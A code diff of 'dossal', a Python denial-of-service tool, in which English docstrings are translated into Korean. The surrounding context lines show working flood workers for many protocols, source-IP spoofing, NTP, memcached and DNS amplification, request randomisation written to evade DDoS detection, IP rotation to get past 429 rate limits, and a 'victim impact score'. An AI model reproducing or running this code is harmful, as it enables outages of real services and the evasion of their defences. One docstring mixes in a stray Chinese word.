@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v0.6 — comprehensive DoS stress engine
+dossal v0.6 - comprehensive DoS stress engine
 Modes:
   http       : HTTP/1.1 keep-alive request flood (plain)
   https      : TLS request flood (HTTP/1.1, self-signed cert)
@@ -12,7 +12,7 @@ Modes:
   quic       : QUIC/HTTP3 UDP datagram flood (simulated Initial packets)
   syn        : TCP SYN flood (connect-only, no read)
   synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
-  rst        : TCP RST flood (connect → send RST via close)
+  rst        : TCP RST flood (connect -> send RST via close)
   fin        : TCP FIN flood (graceful close after connect)
   slowloris  : Slow HTTP header drip (hold connections open)
   udy        : UDP datagram flood (alias for udp)
@@ -39,7 +39,7 @@ _RECOVERY = [False]  # True = auto-replace blocked IPs
 _PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
 
 def _parse_proxy(proxy_url):
-    """Parse proxy URL into (scheme, host, port, user, pass)."""
+    """프록시 URL을 (스키미, 호스트, 포트, 사용자, 패스워드)로 파싱"""
     from urllib.parse import urlparse
     p = urlparse(proxy_url)
     return {
@@ -51,8 +51,8 @@ def _parse_proxy(proxy_url):
     }
 
 def _proxy_connect(host, port, timeout=5.0):
-    """Create a socket connected through the proxy. Returns (sock, proxy_info).
-    For HTTP proxies: CONNECT tunnel. For SOCKS5: basic handshake."""
+    """프록시를 통해 소켓을 연결. (소켓, 프록시정보) 반환.
+    HTTP 프록시: CONNECT 터널. SOCKS5: 기본 핸드셰이크."""
     if not _PROXY[0]:
         return None, None
     
@@ -100,7 +100,7 @@ def _proxy_connect(host, port, timeout=5.0):
     return sock, proxy
 
 def _detect_local_ips():
-    """Detect all local IPv4 addresses."""
+    """로컬 IPv4 주소 전부 감지"""
     import subprocess
     ips = set()
     try:
@@ -117,8 +117,7 @@ def _detect_local_ips():
     return sorted(ips)
 
 def _generate_spoof_ips(count, base_net='203.0.113'):
-    """Generate N spoofed IPs from RFC 5737 TEST-NET-3 (203.0.113.0/24) or random /24 blocks.
-    These are unclaimed IPs - safe to spoof without hitting real hosts."""
+    """RFC 5737 TEST-NET-3(203.0.113.0/24)에서 N개 스푸핑 IP 생성"""
     import random
     ips = []
     # Use multiple /24 blocks to avoid collision
@@ -132,7 +131,7 @@ def _generate_spoof_ips(count, base_net='203.0.113'):
     return ips[:count]
 
 def _get_src_ip(proc_idx, total_procs):
-    """Get source IP for a process (round-robin, skip blocked)."""
+    """프로세스별 소스 IP 반환 (라운드 로빈, 차단 IP 제외)"""
     ips = _SRC_IPS[0]
     if not ips:
         return None
@@ -144,14 +143,14 @@ def _get_src_ip(proc_idx, total_procs):
     return ips[proc_idx % len(ips)] if ips else None
 
 def _mark_blocked(ip):
-    """Mark an IP as blocked (received 429)."""
+    """IP를 차단(429 수신)으로 표시"""
     if ip and ip not in _BLOCKED_IPS:
         _BLOCKED_IPS.add(ip)
         remaining = _active_ip_count()
         print(f"[recovery] IP {ip} blocked (429), {remaining} IPs remaining", file=sys.stderr)
 
 def _active_ip_count():
-    """Count of non-blocked IPs."""
+    """차단되지 않은 IP 개수 반환"""
     ips = _SRC_IPS[0]
     if not ips:
         return 0
@@ -164,7 +163,7 @@ VERSION = "3.16"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
-    """Compute TCP header checksum (IPv4). Returns int."""
+    """TCP 헤더 체크섬 계산 (IPv4). int 반환"""
     ihl = 20  # no IP options
     ip_hdr = struct.pack("!4s4sBBHHHBBH4s4s",
         bytes([0]*4), bytes([0]*4),  # dummy IPs (loopback)
@@ -188,6 +187,7 @@ def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
     return (~s) & 0xffff
 
 def _ip_checksum(ip_hdr):
+    """IP 헤더 체크섬 계산. int 반환"""
     if len(ip_hdr) % 2:
         ip_hdr += b'\x00'
     s = 0
@@ -198,7 +198,7 @@ def _ip_checksum(ip_hdr):
     return (~s) & 0xffff
 
 def _build_tcp_packet(src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b""):
-    """Build a complete IPv4+TCP packet. Returns bytes."""
+    """완전한 IPv4+TCP 패킷 구성. bytes 반환"""
     ip_id = random.randint(0, 65535)
     ip_totlen = 20 + 20 + len(payload)
     ip_hdr = struct.pack("!BBHHHBBH4s4s",
@@ -234,12 +234,13 @@ class Stats:
 
 # ── URL parsers ───────────────────────────────────────────────────
 def parse_http(u):
+    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
     host, port = _host_port(u)
     p = urlparse(u)
     return host, port, p.path or "/"
 
 def _host_port(u):
-    """Extract (host, port) from any URL scheme. Robust to http/https/udp/tcp/etc."""
+    """URL에서 (호스트, 포트) 추출. http/https/udp/tcp 등 모든 스키미 지원."""
     if '://' not in u:
         parts = u.rsplit(':', 1)
         if len(parts) == 2:
@@ -253,18 +254,21 @@ def _host_port(u):
     return p.hostname or '127.0.0.1', int(port)
 
 def parse_http(u):
+    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
     host, port = _host_port(u)
     p = urlparse(u)
     return host, port, p.path or '/'
 
 def parse_tcp(u):
+    """tcp:// URL을 (호스트, 포트)로 파싱"""
     return _host_port(u)
 
 def parse_udp(u):
+    """udp:// URL을 (호스트, 포트)로 파싱"""
     return _host_port(u)
 
 def parse_ws(u):
-    """Parse ws:// or wss:// URL."""
+    """ws:// 또는 wss:// URL 파싱."""
     from urllib.parse import urlparse
     host, port = _host_port(u)
     p = urlparse(u)
@@ -275,10 +279,12 @@ def parse_ws(u):
     return host, port, p.path or "/"
 
 def parse_ip_port(u):
+    """IP:포트를 파싱. (호스트, 포트) 반환"""
     return _host_port(u)
 
 # ── HTTP response reader ──────────────────────────────────────────
 async def _read_http_response(reader):
+    """HTTP 응답을 Content-Length 기반으로 전체 읽기"""
     header_data = b''
     while b'\r\n\r\n' not in header_data:
         try:
@@ -312,6 +318,7 @@ async def _read_http_response(reader):
 # ═══════════════════════════════════════════════════════════════════
 
 async def http_worker(name, url, stats, duration, stop, payload_size=0):
+    """HTTP L7 공격 워커: asyncio 기반 HTTP 요청 폭주"""
     host, port, path = parse_http(url)
     reader, writer = await asyncio.open_connection(host, port)
     req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
@@ -337,8 +344,7 @@ async def http_worker(name, url, stats, duration, stop, payload_size=0):
         writer.transport.abort()
 
 def _make_tls_ctx(proc_idx):
-    """Create a TLS context with randomized fingerprint (JA3 variation).
-    Each process gets a slightly different cipher/ALPN/protocol config."""
+    """TLS 컨텍스트 생성 (fingerprint 랜덤화: cipher/ALPN/SNI 변동)"""
     import ssl as _ssl
     import random as _rnd
     ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
@@ -385,7 +391,7 @@ def _make_tls_ctx(proc_idx):
     return ctx
 
 def _mp_https_flood(args_tuple):
-    """Multi-process HTTPS flooder: TLS 1.3 0-RTT + HTTP with randomized fingerprint."""
+    """멀티프로세스 HTTPS 전송 (TLS 1.3 0-RTT + fingerprint 랜덤화)"""
     import time as _time
     import ssl as _ssl
     import socket as _socket
@@ -477,7 +483,7 @@ def _mp_https_flood(args_tuple):
     return sent, errors
 
 async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
-    """HTTPS multiprocess worker."""
+    """HTTPS 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 TLS 연결"""
     host, port, path = parse_http(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
@@ -497,6 +503,7 @@ async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
     stats.conns += n_procs
 
 async def https_worker(name, url, stats, duration, stop, payload_size=0):
+    """HTTPS L7 공격 워커: TLS + HTTP 요청 폭주"""
     host, port, path = parse_http(url)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
@@ -527,6 +534,7 @@ async def https_worker(name, url, stats, duration, stop, payload_size=0):
         writer.transport.abort()
 
 async def ws_worker(name, url, stats, duration, stop, payload_size=128):
+    """WebSocket 공격 워커: WS 연결 유지 + 메시지 폭주"""
     host, port, path = parse_ws(url)
     reader, writer = await asyncio.open_connection(host, port)
     key = base64.b64encode(random.randbytes(16)).decode()
@@ -576,7 +584,7 @@ async def ws_worker(name, url, stats, duration, stop, payload_size=128):
         pass
 
 def _mp_tcp_flood(args_tuple):
-    """Multi-process TCP byte flooder: connect, send repeatedly."""
+    """멀티프로세스 TCP 바이트 패킷: 연결 후 반복 전송."""
     host, port, duration, payload_size = args_tuple
     import time as _time
     payload = b"A" * payload_size
@@ -601,6 +609,7 @@ def _mp_tcp_flood(args_tuple):
     return bytes_sent, pkts, errors
 
 async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
+    """TCP L4 공격 워커: 반복 TCP 연결 폭주"""
     host, port = parse_tcp(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))  # TCP uses same proc count
     
@@ -622,7 +631,7 @@ async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
 _UDP_NPROCS = [4]  # mutable list to allow global override
 
 def _mp_udp_send(args_tuple):
-    """Multi-process UDP sender: runs in a child process."""
+    """멀티프로세스 UDP 패킷 전송"""
     host, port, duration, payload_size = args_tuple
     import time as _time
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -642,10 +651,10 @@ def _mp_udp_send(args_tuple):
     return sent
 
 def _mp_udp_spoof(args_tuple):
-    """Multi-process UDP sender with source IP binding.
-    Each process binds to a different source IP (from the pool).
-    On Windows (admin): raw socket + IP_HDRINCL for true IP spoofing.
-    On macOS/Linux: SOCK_DGRAM + bind() for real local IPs."""
+    """멀티프로세스 UDP 송신 (소스 IP 바인딩).
+    각 프로세스는 풀에서 다른 소스 IP에 바인딩.
+    Windows(관리자): raw socket + IP_HDRINCL로 진짜 스푸핑.
+    macOS/Linux: SOCK_DGRAM + bind()로 로컬 IP."""
     import time as _time
     import struct as _struct
     host, port, duration, payload_size, src_ip = args_tuple
@@ -714,6 +723,7 @@ def _mp_udp_spoof(args_tuple):
     return sent
 
 async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
+    """UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
     host, port = parse_udp(url)
     n_procs = _UDP_NPROCS[0]
     
@@ -753,6 +763,7 @@ async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.bytes += total * payload_size
 
 async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
+    """HTTP/2 (h2) 공격 워커: ALPN 협상 + H2 스트림 폭주"""
     host, port, path = parse_http(url)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
@@ -845,7 +856,7 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
 
 # ── DNS flood: UDP DNS query flood ──────────────────────────────
 def _mp_dns_flood(args_tuple):
-    """Multi-process DNS query flooder: spoofed source IP, random domain."""
+    """멀티프로세스 DNS 쿼리 패킷: 스푸핑 소스 IP + 랜덤 도메인."""
     import time as _time
     import random as _rnd
     import struct as _struct
@@ -887,7 +898,7 @@ def _mp_dns_flood(args_tuple):
     return sent
 
 async def dns_worker(name, url, stats, duration, stop, payload_size=0):
-    """DNS flood worker: UDP DNS queries with spoofed IPs."""
+    """DNS amplification 워커: UDP DNS 쿼리 폭주"""
     host, port = parse_udp(url)
     n_procs = max(1, min(16, _UDP_NPROCS[0]))
     import multiprocessing as mp
@@ -907,7 +918,7 @@ async def dns_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── ICMP flood: ping flood ──────────────────────────────────────
 def _mp_icmp_flood(args_tuple):
-    """Multi-process ICMP ping flooder."""
+    """멀티프로세스 ICMP ping 패킷."""
     import time as _time
     import struct as _struct
     import os
@@ -959,7 +970,7 @@ def _mp_icmp_flood(args_tuple):
     return sent
 
 async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
-    """ICMP ping flood worker."""
+    """ICMP flood 워커: UDP로 ICMP 패킷 폭주"""
     host, port = parse_udp(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     import multiprocessing as mp
@@ -976,7 +987,7 @@ async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── SSDP/UPnP flood: M-SEARCH flood (UDP 1900) ──────────────────
 def _mp_ssdp_flood(args_tuple):
-    """Multi-process SSDP M-SEARCH flooder: IoT/UPnP target."""
+    """멀티프로세스 SSDP M-SEARCH 패킷: IoT/UPnP 타겟."""
     import time as _time
     import random as _rnd
     host, port, duration = args_tuple
@@ -1008,7 +1019,7 @@ def _mp_ssdp_flood(args_tuple):
     return sent
 
 async def ssdp_worker(name, url, stats, duration, stop, payload_size=0):
-    """SSDP M-SEARCH flood worker."""
+    """SSDP/UPnP flood 워커: UDP M-SEARCH 폭주 (IoT 타격)"""
     host, port = parse_udp(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     import multiprocessing as mp
@@ -1025,7 +1036,7 @@ async def ssdp_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── NTP amplification: mon_list (UDP 123) ───────────────────────
 def _mp_ntp_flood(args_tuple):
-    """Multi-process NTP mon_list flooder: amplification attack."""
+    """멀티프로세스 NTP mon_list 패킷: 증폭 공격."""
     import time as _time
     import random as _rnd
     import struct as _struct
@@ -1056,7 +1067,7 @@ def _mp_ntp_flood(args_tuple):
     return sent
 
 async def ntp_worker(name, url, stats, duration, stop, payload_size=0):
-    """NTP amplification worker."""
+    """NTP amplification 워커: UDP NTP monlist 쿼리 폭주"""
     host, port = parse_udp(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     import multiprocessing as mp
@@ -1076,7 +1087,7 @@ async def ntp_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── Memcached amplification: GET request (UDP 11211) ───────────
 def _mp_memcached_flood(args_tuple):
-    """Multi-process Memcached GET flooder: amplification attack."""
+    """멀티프로세스 Memcached GET 패킷: 증폭 공격."""
     import time as _time
     import random as _rnd
     host, port, duration, src_ip = args_tuple
@@ -1107,7 +1118,7 @@ def _mp_memcached_flood(args_tuple):
     return sent
 
 async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
-    """Memcached amplification worker."""
+    """Memcached amplification 워커: UDP get 폭주"""
     host, port = parse_udp(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     import multiprocessing as mp
@@ -1127,8 +1138,7 @@ async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── H2 multiprocess: raw socket + h2 frames ─────────────────────
 def _mp_h2_flood(args_tuple):
-    """Multi-process H2 flooder: TLS + h2 in a child process.
-    Each process opens one H2 connection with many concurrent streams."""
+    """멀티프로세스 H2 전송 (1개 H2 연결, 배치 요청)"""
     import time as _time
     import ssl as _ssl
     import socket as _socket
@@ -1216,7 +1226,7 @@ def _mp_h2_flood(args_tuple):
     return sent, errors, h2_429
 
 async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
-    """H2 multiprocess worker: N processes, each with their own H2 conn."""
+    """HTTP/2 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 H2 연결"""
     host, port, path = parse_http(url)
     n_procs = max(1, min(16, _UDP_NPROCS[0]))
     # Each process: 100 concurrent streams
@@ -1236,7 +1246,7 @@ async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
 
 # ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
 def _mp_grpc_flood(args_tuple):
-    """Multi-process gRPC flooder: TLS + h2 + gRPC frames in a child process."""
+    """멀티프로세스 gRPC 패킷: 자식 프로세스에서 TLS + H2 + gRPC 프레임."""
     import time as _time
     import ssl as _ssl
     import socket as _socket
@@ -1303,7 +1313,7 @@ def _mp_grpc_flood(args_tuple):
     return sent, errors
 
 async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
-    """gRPC multiprocess worker."""
+    """gRPC 멀티프로세스 공격 워커"""
     host, port, path = parse_http(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
@@ -1322,6 +1332,7 @@ async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
     stats.conns += n_procs
 
 async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
+    """gRPC L7 공격 워커: HTTP/2 기반 gRPC 요청 폭주"""
     host, port, path = parse_http(url)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
@@ -1379,7 +1390,7 @@ async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
         writer.transport.abort()
 
 async def _grpc_reader(conn, reader, stats):
-    """Background reader: drain h2 frames to keep the connection alive."""
+    """백그라운드 리더: H2 프레임 배수 (연결 유지)."""
     try:
         while True:
             chunk = await reader.read(8192)
@@ -1394,7 +1405,7 @@ async def _grpc_reader(conn, reader, stats):
 
 # ── QUIC/HTTP3 worker: raw UDP with QUIC-like framing ───────────
 def _mp_quic_send(args_tuple):
-    """Multi-process QUIC sender: runs in a child process."""
+    """멀티프로세스 QUIC/UDP 패킷 전송"""
     host, port, duration, payload_size = args_tuple
     import time as _time
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -1414,6 +1425,7 @@ def _mp_quic_send(args_tuple):
     return sent
 
 async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
+    """QUIC/UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
     host, port = parse_udp(url)
     n_procs = _UDP_NPROCS[0]
     
@@ -1432,8 +1444,7 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.bytes += total * plen
 
 def _mp_h3_send(args_tuple):
-    """HTTP/3 flood: QUIC Initial packets with H3 SETTINGS + GET frames.
-    Different from quic (raw UDP) — this is protocol-level H3 request flood."""
+    """멀티프로세스 HTTP/3 전송 (QUIC Initial + H3 SETTINGS + GET)"""
     import socket as _socket
     import time as _time
     import os as _os
@@ -1488,7 +1499,7 @@ def _mp_h3_send(args_tuple):
     return sent
 
 async def h3mp_worker(name, url, stats, duration, stop, payload_size=1400):
-    """HTTP/3 multiprocess flood: QUIC Initial + H3 frames."""
+    """HTTP/3 (h3) 멀티프로세스 워커: QUIC Initial + H3 프레임 폭주"""
     host, port = parse_udp(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
@@ -1507,8 +1518,7 @@ async def h3mp_worker(name, url, stats, duration, stop, payload_size=1400):
 
 # ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
 def _random_http_req(host, path):
-    """Generate a randomized HTTP request to defeat signature-based DDoS detection.
-    Random path, random headers, random size, random User-Agent."""
+    """랜덤화 HTTP 요청 생성 (path/UA/headers 랜덤, 시그니처 DDoS 방어 우회)"""
     import random as _rnd
     # Random path variation: /, /index.html, /api/v1, /static/app.js, etc.
     paths = [path, '/', '/index.html', '/api', '/static/main.js', '/css/style.css',
@@ -1581,10 +1591,7 @@ def _random_http_req(host, path):
     return req.encode()
 
 def _mp_http_send(args_tuple):
-    """Multi-process raw socket HTTP sender with 429 detection + IP recovery.
-    Uses keep-alive: one connection per process, only reconnect on 429 or error.
-    Payload randomization defeats signature-based DDoS detection.
-    Proxy support: if proxy_host given, connect through HTTP CONNECT tunnel."""
+    """멀티프로세스 raw socket HTTP 전송 (429 감지 + IP 교체 + 프록시)"""
     import time as _time
     if len(args_tuple) == 7:
         host, port, path, duration, src_ip, ip_pool, proxy = args_tuple
@@ -1669,7 +1676,7 @@ def _mp_http_send(args_tuple):
     return sent, errors, blocked, cur_ip
 
 async def _wait_pool(pool, async_result, timeout):
-    """Wait for a multiprocessing pool result using a dedicated executor."""
+    """multiprocessing pool 결과 대기 (executor 기반)"""
     loop = asyncio.get_event_loop()
     import concurrent.futures
     with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ded:
@@ -1685,7 +1692,7 @@ async def _wait_pool(pool, async_result, timeout):
     return results
 
 async def raw_worker(name, url, stats, duration, stop, payload_size=0):
-    """Raw HTTP multiprocess worker: max RPS via raw socket, with IP spoofing + 429 recovery."""
+    """Raw HTTP 멀티프로세스 워커: raw socket으로 최대 RPS"""
     host, port, path = parse_http(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
@@ -1735,7 +1742,7 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── WebSocket multiprocess: raw socket WS frame flood ────────────
 def _mp_ws_flood(args_tuple):
-    """Multi-process WebSocket flooder: connect, upgrade, send frames."""
+    """멀티프로세스 WebSocket 패킷: 연결, 업그레이드, 프레임 전송."""
     import time as _time
     import struct as _struct
     import base64 as _b64
@@ -1817,7 +1824,7 @@ def _mp_ws_flood(args_tuple):
     return msgs, errors
 
 async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
-    """WebSocket multiprocess worker."""
+    """WebSocket 멀티프로세스 워커: N개 프로세스, 각각 1개 WS 연결"""
     host, port, path = parse_ws(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
@@ -1842,8 +1849,8 @@ async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
 
 # ── SYN flood: connect only, never read ──────────────────────────
 def _mp_syn_flood(args_tuple):
-    """Multi-process SYN flooder: connect only (SYN).
-    On Windows (admin): raw socket + IP_HDRINCL for true SYN spoofing."""
+    """멀티프로세스 SYN 패킷: 연결만 (SYN).
+    Windows(관리자): raw socket + IP_HDRINCL로 진짜 SYN 스푸핑."""
     host, port, duration, src_ip = args_tuple
     import time as _time
     import errno as _errno
@@ -1919,6 +1926,7 @@ def _mp_syn_flood(args_tuple):
     return conns, errors
 
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
+    """TCP SYN flood 워커: SYN만 전송 (핸드셰이크 미완료)"""
     host, port = parse_ip_port(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     
@@ -1941,7 +1949,7 @@ async def syn_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
 def _mp_synack_flood(args_tuple):
-    """Multi-process SYNACK/RST flooder."""
+    """멀티프로세스 SYN-ACK/RST 패킷."""
     host, port, duration = args_tuple
     import time as _time
     import errno as _errno
@@ -1973,6 +1981,7 @@ def _mp_synack_flood(args_tuple):
     return conns, errors
 
 async def synack_worker(name, url, stats, duration, stop, payload_size=0):
+    """TCP SYN-ACK flood 워커: SYN-ACK만 전송"""
     host, port = parse_ip_port(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     
@@ -1991,14 +2000,14 @@ async def synack_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
 def _open_rst_sock(host, port):
-    """Open TCP conn; close() after send with unread data → RST (no SO_LINGER)."""
+    """TCP 연결 후 미읽은 데이터와 함께 close() -> RST (SO_LINGER 없음)."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(0.5)  # fast timeout
     s.connect((host, port))
     return s
 
 def _mp_rst_flood(args_tuple):
-    """Multi-process RST flooder: connect, send, close (RST)."""
+    """멀티프로세스 RST 패킷: 연결, 전송, close (RST)."""
     host, port, duration, payload = args_tuple
     import time as _time
     import errno as _errno
@@ -2032,6 +2041,7 @@ def _mp_rst_flood(args_tuple):
     return conns, errors
 
 async def rst_worker(name, url, stats, duration, stop, payload_size=1):
+    """TCP RST flood 워커: RST 패킷 폭주"""
     host, port = parse_ip_port(url)
     payload = b"X" * max(1, payload_size)
     n_procs = _UDP_NPROCS[0]
@@ -2049,16 +2059,16 @@ async def rst_worker(name, url, stats, duration, stop, payload_size=1):
         stats.conns += conns
         stats.errors += errs
 
-# ── FIN flood: connect → graceful close (FIN) ────────────────────
+# ── FIN flood: connect -> graceful close (FIN) ────────────────────
 def _open_fin_sock(host, port):
-    """Open a TCP connection, drain nothing, close gracefully (FIN)."""
+    """TCP 연결 후 데이터 배수 없이 정상 close (FIN)."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(0.5)  # fast timeout
     s.connect((host, port))
     return s
 
 def _mp_fin_flood(args_tuple):
-    """Multi-process FIN flooder: connect, graceful close (FIN)."""
+    """멀티프로세스 FIN 패킷: 연결, 정상 close (FIN)."""
     host, port, duration = args_tuple
     import time as _time
     import errno as _errno
@@ -2101,6 +2111,7 @@ def _mp_fin_flood(args_tuple):
     return conns, errors
 
 async def fin_worker(name, url, stats, duration, stop, payload_size=0):
+    """TCP FIN flood 워커: FIN 패킷 폭주"""
     host, port = parse_ip_port(url)
     n_procs = max(1, min(8, _UDP_NPROCS[0]))
     
@@ -2119,6 +2130,7 @@ async def fin_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── Slowloris: open connection, send partial headers slowly ──────
 async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
+    """Slowloris 워커: TCP 연결 유지 + 느린 헤더 드립"""
     host, port, path = parse_http(url)
     try:
         reader, writer = await asyncio.open_connection(host, port)
@@ -2186,7 +2198,7 @@ DEFAULT_PAYLOADS = {
 # ═══════════════════════════════════════════════════════════════════
 
 async def _sample_process(pid, interval=0.5, duration=5):
-    """Sample CPU% and memory of a process for `duration` seconds."""
+    """프로세스 CPU%/메모리 샘플링 (지정 시간)."""
     try:
         import psutil
         proc = psutil.Process(pid)
@@ -2209,7 +2221,7 @@ async def _sample_process(pid, interval=0.5, duration=5):
     return None
 
 async def _find_pid(port):
-    """Find PID listening on a port using lsof, fallback to ps."""
+    """포트监听 PID 검색 (lsof, 폴백 ps)."""
     loop = asyncio.get_event_loop()
     try:
         out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
@@ -2233,7 +2245,7 @@ async def _find_pid(port):
     return None
 
 class CpuSampler:
-    """Sample a process's CPU% in the background using psutil."""
+    """프로세스 CPU% 백그라운드 샘플링 (psutil)."""
     def __init__(self, pid):
         self.pid = pid
         self.samples = []
@@ -2262,7 +2274,7 @@ class CpuSampler:
         return 0.0
 
 async def impact_score(url, stats, duration, sampler=None, base_cpu=0.0):
-    """Compute victim impact score. All psutil calls in executor."""
+    """피해 임팩트 점수 계산. psutil 호출 전부 executor에서."""
     loop = asyncio.get_event_loop()
     host, port = parse_ip_port(url)
 
@@ -2331,6 +2343,7 @@ async def impact_score(url, stats, duration, sampler=None, base_cpu=0.0):
 # ═══════════════════════════════════════════════════════════════════
 
 async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_conns=None):
+    """dossal 메인 실행: 모드 선택, 타임아웃, 결과 출력"""
     if mode_conns is None:
         mode_conns = {}
     stop = asyncio.Event()
@@ -2367,8 +2380,7 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
     return stats
 
 def auto_probe(url):
-    """Probe target to detect protocol and suggest optimal modes.
-    If URL has no scheme (bare domain), try https:443 first, then http:80."""
+    """프로토콜 자동 감지: https:443 -> http:80 순서 probe"""
     from urllib.parse import urlparse
     import socket as _sock
     parsed = urlparse(url)
@@ -2466,8 +2478,9 @@ def auto_probe(url):
     return results
 
 def main():
+    """CLI 파싱 + run() 호출"""
     ap = argparse.ArgumentParser(
-        description="dossal v" + VERSION + " — comprehensive DoS stress engine",
+        description="dossal v" + VERSION + " - comprehensive DoS stress engine",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
@@ -2547,7 +2560,7 @@ examples:
     }
     if args.combo:
         args.mode = COMBOS[args.combo]
-        print(f"[combo] {args.combo} → {args.mode}", file=sys.stderr)
+        print(f"[combo] {args.combo} -> {args.mode}", file=sys.stderr)
     
     # Dry-run: probe and predict, don't attack
     if args.dry_run:
@@ -2574,7 +2587,7 @@ examples:
         print(f"[dry-run] Recovery: {'ON' if args.recovery else 'OFF'}", file=sys.stderr)
         print(f"[dry-run] Predicted: ~{total_rps:,} RPS (combined)", file=sys.stderr)
         print(f"[dry-run] Per-IP limit bypass: {spoof_n} IPs × 1000 RPS = {spoof_n * 1000:,} RPS max", file=sys.stderr)
-        print(f"[dry-run] NO ATTACK SENT — remove --dry-run to start", file=sys.stderr)
+        print(f"[dry-run] NO ATTACK SENT - remove --dry-run to start", file=sys.stderr)
         import sys as _sys
         _sys.exit(0)
 
@@ -2763,7 +2776,7 @@ examples:
         _generate_report(args.report, report, args)
 
 def _generate_report(path, report, args):
-    """Generate an HTML attack report."""
+    """HTML 공격 리포트 생성."""
     import datetime
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     rps = report.get("rps", 0)
